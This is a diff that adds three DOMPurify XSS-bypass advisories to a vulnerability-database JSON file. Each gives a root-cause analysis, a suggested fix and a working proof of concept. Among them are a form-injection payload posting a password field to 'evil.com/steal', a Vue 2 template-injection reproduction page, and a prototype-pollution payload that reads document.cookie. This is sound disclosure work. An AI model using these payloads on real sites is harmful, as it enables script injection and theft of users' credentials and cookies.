@@ -5496,6 +5496,66 @@
         "info": [
           "https://github.com/cure53/DOMPurify/security/advisories/GHSA-39q2-94rc-95cp"
         ]
+      },
+      {
+        "atOrAbove": "0",
+        "below": "3.4.0",
+        "severity": "medium",
+        "cwe": [
+          "CWE-183",
+          "CWE-79"
+        ],
+        "identifiers": {
+          "summary": "There is an inconsistency between FORBID_TAGS and FORBID_ATTR handling when function-based ADD_TAGS is used.\n\nCommit [c361baa](https://github.com/cure53/DOMPurify/commit/c361baa18dbdcb3344a41110f4c48ad85bf48f80) added an early exit for FORBID_ATTR at line 1214:\n\n    /* FORBID_ATTR must always win, even if ADD_ATTR predicate would allow it */\n    if (FORBID_ATTR[lcName]) {\n      return false;\n    }\n\nThe same fix was not applied to FORBID_TAGS. At line 1118-1123, when EXTRA_ELEMENT_HANDLING.tagCheck returns true, the short-circuit evaluation skips the FORBID_TAGS check entirely:\n\n    if (\n      !(\n        EXTRA_ELEMENT_HANDLING.tagCheck instanceof Function &&\n        EXTRA_ELEMENT_HANDLING.tagCheck(tagName)  // true -> short-circuits\n      ) &&\n      (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])  // never evaluated\n    ) {\n\nThis allows forbidden elements to survive sanitization with their attributes intact.\n\nPoC (tested against current HEAD in Node.js + jsdom):\n\n    const DOMPurify = createDOMPurify(window);\n\n    DOMPurify.sanitize(\n      '<iframe src=\"https://evil.com\"></iframe>',\n      {\n        ADD_TAGS: function(tag) { return true; },\n        FORBID_TAGS: ['iframe']\n      }\n    );\n    // Returns: '<iframe src=\"https://evil.com\"></iframe>'\n    // Expected: '' (iframe forbidden)\n\n    DOMPurify.sanitize(\n      '<form action=\"https://evil.com/steal\"><input name=password></form>',\n      {\n        ADD_TAGS: function(tag) { return true; },\n        FORBID_TAGS: ['form']\n      }\n    );\n    // Returns: '<form action=\"https://evil.com/steal\"><input name=\"password\"></form>'\n    // Expected: '<input name=\"password\">' (form forbidden)\n\nConfirmed affected: iframe, object, embed, form. The src/action/data attributes survive because attribute sanitization runs separately and allows these URLs.\n\nCompare with FORBID_ATTR which correctly wins:\n\n    DOMPurify.sanitize(\n      '<p onclick=\"alert(1)\">hello</p>',\n      {\n        ADD_ATTR: function(attr) { return true; },\n        FORBID_ATTR: ['onclick']\n      }\n    );\n    // Returns: '<p>hello</p>' (onclick correctly removed)\n\nSuggested fix: add FORBID_TAGS early exit before the tagCheck evaluation, mirroring line 1214:\n\n    /* FORBID_TAGS must always win, even if ADD_TAGS predicate would allow it */\n    if (FORBID_TAGS[tagName]) {\n      // proceed to removal logic\n    }\n\nThis requires function-based ADD_TAGS in the config, which is uncommon. But the asymmetry with the FORBID_ATTR fix is clear, and the impact includes iframe and form injection with external URLs.\n\nReporter: Koda Reef",
+          "githubID": "GHSA-h7mw-gpvr-xq4m",
+          "CVE": [
+            "CVE-2026-41240"
+          ]
+        },
+        "info": [
+          "https://github.com/cure53/DOMPurify/security/advisories/GHSA-h7mw-gpvr-xq4m",
+          "https://github.com/cure53/DOMPurify/releases/tag/3.4.0"
+        ]
+      },
+      {
+        "atOrAbove": "1.0.10",
+        "below": "3.4.0",
+        "severity": "medium",
+        "cwe": [
+          "CWE-1289",
+          "CWE-79"
+        ],
+        "identifiers": {
+          "summary": "## Summary\n\n| Field | Value |\n|:------|:------|\n| **Severity** | Medium |\n| **Affected** | DOMPurify `main` at [`883ac15`](https://github.com/cure53/DOMPurify/tree/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6), introduced in v1.0.10 ([`7fc196db`](https://github.com/cure53/DOMPurify/commit/7fc196db0b42a0c360262dba0cc39c9c91bfe1ec)) |\n\n`SAFE_FOR_TEMPLATES` strips `{{...}}` expressions from untrusted HTML. This works in string mode but not with `RETURN_DOM` or `RETURN_DOM_FRAGMENT`, allowing XSS via template-evaluating frameworks like Vue 2.\n\n## Technical Details\n\nDOMPurify strips template expressions in two passes:\n\n1. **Per-node** — each text node is checked during the tree walk ([`purify.ts:1179-1191`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1179-L1191)):\n\n```js\n// pass #1: runs on every text node during tree walk\nif (SAFE_FOR_TEMPLATES && currentNode.nodeType === NODE_TYPE.text) {\n  content = currentNode.textContent;\n  content = content.replace(MUSTACHE_EXPR, ' ');  // {{...}} -> ' '\n  content = content.replace(ERB_EXPR, ' ');        // <%...%> -> ' '\n  content = content.replace(TMPLIT_EXPR, ' ');      // ${...  -> ' '\n  currentNode.textContent = content;\n}\n```\n\n2. **Final string scrub** — after serialization, the full HTML string is scrubbed again ([`purify.ts:1679-1683`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1679-L1683)). This is the safety net that catches expressions that only form after the DOM settles.\n\nThe `RETURN_DOM` path returns before pass #2 ever runs ([`purify.ts:1637-1661`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1637-L1661)):\n\n```js\n// purify.ts (simplified)\n\nif (RETURN_DOM) {\n  // ... build returnNode ...\n  return returnNode;        // <-- exits here, pass #2 never runs\n}\n\n// pass #2: only reached by string-mode callers\nif (SAFE_FOR_TEMPLATES) {\n  serializedHTML = serializedHTML.replace(MUSTACHE_EXPR, ' ');\n}\nreturn serializedHTML;\n```\n\nThe payload `{<foo></foo>{constructor.constructor('alert(1)')()}<foo></foo>}` exploits this:\n\n1. Parser creates: `TEXT(\"{\")` → `<foo>` → `TEXT(\"{payload}\")` → `<foo>` → `TEXT(\"}\")` — no single node contains `{{`, so pass #1 misses it\n2. `<foo>` is not allowed, so DOMPurify removes it but keeps surrounding text\n3. The three text nodes are now adjacent — `.outerHTML` reads them as `{{payload}}`, which Vue 2 compiles and executes\n\n## Reproduce\n\nOpen the following html in any browser and `alert(1)` pops up.\n\n```html\n<!DOCTYPE html>\n<html>\n\n<body>\n  <script src=\"https://cdn.jsdelivr.net/npm/dompurify@3.3.3/dist/purify.min.js\"></script>\n  <script src=\"https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.min.js\"></script>\n  <script>\n    var dirty = '<div id=\"app\">{<foo></foo>{constructor.constructor(\"alert(1)\")()}<foo></foo>}</div>';\n    var dom = DOMPurify.sanitize(dirty, { SAFE_FOR_TEMPLATES: true, RETURN_DOM: true });\n    document.body.appendChild(dom.firstChild);\n    new Vue({ el: '#app' });\n  </script>\n</body>\n\n</html>\n```\n\n## Impact\n\nAny application that sanitizes attacker-controlled HTML with `SAFE_FOR_TEMPLATES: true` and `RETURN_DOM: true` (or `RETURN_DOM_FRAGMENT: true`), then mounts the result into a template-evaluating framework, is vulnerable to XSS.\n\n## Recommendations\n\n### Fix\n\n`normalize()` merges the split text nodes, then the same regex from the string path catches the expression. Placed before the fragment logic, this fixes both `RETURN_DOM` and `RETURN_DOM_FRAGMENT`.\n\n```diff\n     if (RETURN_DOM) {\n+      if (SAFE_FOR_TEMPLATES) {\n+        body.normalize();\n+        let html = body.innerHTML;\n+        arrayForEach([MUSTACHE_EXPR, ERB_EXPR, TMPLIT_EXPR], (expr: RegExp) => {\n+          html = stringReplace(html, expr, ' ');\n+        });\n+        body.innerHTML = html;\n+      }\n+\n       if (RETURN_DOM_FRAGMENT) {\n         returnNode = createDocumentFragment.call(body.ownerDocument);\n```",
+          "githubID": "GHSA-crv5-9vww-q3g8",
+          "CVE": [
+            "CVE-2026-41239"
+          ]
+        },
+        "info": [
+          "https://github.com/cure53/DOMPurify/security/advisories/GHSA-crv5-9vww-q3g8",
+          "https://github.com/cure53/DOMPurify/releases/tag/3.4.0"
+        ]
+      },
+      {
+        "atOrAbove": "3.0.1",
+        "below": "3.4.0",
+        "severity": "medium",
+        "cwe": [
+          "CWE-1321",
+          "CWE-79"
+        ],
+        "identifiers": {
+          "summary": "## Summary\n\nDOMPurify versions 3.0.1 through 3.3.3 (latest) are vulnerable to a prototype pollution-based XSS bypass. When an application uses `DOMPurify.sanitize()` with the default configuration (no `CUSTOM_ELEMENT_HANDLING` option), a prior prototype pollution gadget can inject permissive `tagNameCheck` and `attributeNameCheck` regex values into `Object.prototype`, causing DOMPurify to allow arbitrary custom elements with arbitrary attributes — including event handlers — through sanitization.\n\n## Affected Versions\n\n- **3.0.1 through 3.3.3** (current latest) — all affected\n- **3.0.0 and all 2.x versions** — NOT affected (used `Object.create(null)` for initialization, no `|| {}` reassignment)\n- The vulnerable `|| {}` reassignment was introduced in the 3.0.0→3.0.1 refactor\n- This is **distinct** from GHSA-cj63-jhhr-wcxv (USE_PROFILES Array.prototype pollution, fixed in 3.3.2)\n- This is **distinct** from CVE-2024-45801 / GHSA-mmhx-hmjr-r674 (__depth prototype pollution, fixed in 3.1.3)\n\n## Root Cause\n\nIn `purify.js` at line 590, during config parsing:\n\n```javascript\nCUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {};\n```\n\nWhen no `CUSTOM_ELEMENT_HANDLING` is specified in the config (the default usage pattern), `cfg.CUSTOM_ELEMENT_HANDLING` is `undefined`, and the fallback `{}` is used. This plain object inherits from `Object.prototype`.\n\nLines 591-598 then check `cfg.CUSTOM_ELEMENT_HANDLING` (the original config property) — which is `undefined` — so the conditional blocks that would set `tagNameCheck` and `attributeNameCheck` from the config are never entered.\n\nAs a result, `CUSTOM_ELEMENT_HANDLING.tagNameCheck` and `CUSTOM_ELEMENT_HANDLING.attributeNameCheck` resolve via the prototype chain. If an attacker has polluted `Object.prototype.tagNameCheck` and `Object.prototype.attributeNameCheck` with permissive values (e.g., `/.*/`), these polluted values flow into DOMPurify's custom element validation at lines 973-977 and attribute validation, causing all custom elements and all attributes to be allowed.\n\n## Impact\n\n- **Attack type:** XSS bypass via prototype pollution chain\n- **Prerequisites:** Attacker must have a prototype pollution primitive in the same execution context (e.g., vulnerable version of lodash, jQuery.extend, query-string parser, deep merge utility, or any other PP gadget)\n- **Config required:** Default. No special DOMPurify configuration needed. The standard `DOMPurify.sanitize(userInput)` call is affected.\n- **Payload:** Any HTML custom element (name containing a hyphen) with event handler attributes survives sanitization\n\n## Proof of Concept\n\n```javascript\n// Step 1: Attacker exploits a prototype pollution gadget elsewhere in the application\nObject.prototype.tagNameCheck = /.*/;\nObject.prototype.attributeNameCheck = /.*/;\n\n// Step 2: Application sanitizes user input with DEFAULT config\nconst clean = DOMPurify.sanitize('<x-x onfocus=alert(document.cookie) tabindex=0 autofocus>');\n\n// Step 3: \"Sanitized\" output still contains the event handler\nconsole.log(clean);\n// Output: <x-x onfocus=\"alert(document.cookie)\" tabindex=\"0\" autofocus=\"\">\n\n// Step 4: When injected into DOM, XSS executes\ndocument.body.innerHTML = clean; // alert() fires\n```\n\n### Tested configurations that are vulnerable:\n\n| Call Pattern | Vulnerable? |\n|---|---|\n| `DOMPurify.sanitize(input)` | YES |\n| `DOMPurify.sanitize(input, {})` | YES |\n| `DOMPurify.sanitize(input, { CUSTOM_ELEMENT_HANDLING: null })` | YES |\n| `DOMPurify.sanitize(input, { CUSTOM_ELEMENT_HANDLING: {} })` | NO (explicit object triggers L591 path) |\n\n## Suggested Fix\n\nChange line 590 from:\n```javascript\nCUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {};\n```\n\nTo:\n```javascript\nCUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || create(null);\n```\n\nThe `create(null)` function (already used elsewhere in DOMPurify, e.g., in `clone()`) creates an object with no prototype, preventing prototype chain inheritance.\n\n### Alternative application-level mitigation:\n\nApplications can protect themselves by always providing an explicit `CUSTOM_ELEMENT_HANDLING` in their config:\n\n```javascript\nDOMPurify.sanitize(input, {\n  CUSTOM_ELEMENT_HANDLING: {\n    tagNameCheck: null,\n    attributeNameCheck: null\n  }\n});\n```\n\n## Timeline\n\n- **2026-04-04:** Vulnerability discovered during automated DOMPurify fuzzing research (Fermat project)\n- **2026-04-04:** Confirmed in Chrome browser with DOMPurify 3.3.3\n- **2026-04-04:** Verified distinct from GHSA-cj63-jhhr-wcxv and CVE-2024-45801\n- **2026-04-04:** Advisory drafted, responsible disclosure initiated\n\n## Credit\n\nhttps://github.com/trace37labs",
+          "githubID": "GHSA-v9jr-rg53-9pgp",
+          "CVE": [
+            "CVE-2026-41238"
+          ]
+        },
+        "info": [
+          "https://github.com/cure53/DOMPurify/security/advisories/GHSA-v9jr-rg53-9pgp",
+          "https://github.com/cure53/DOMPurify/releases/tag/3.4.0"
+        ]
       }
     ],
     "extractors": {
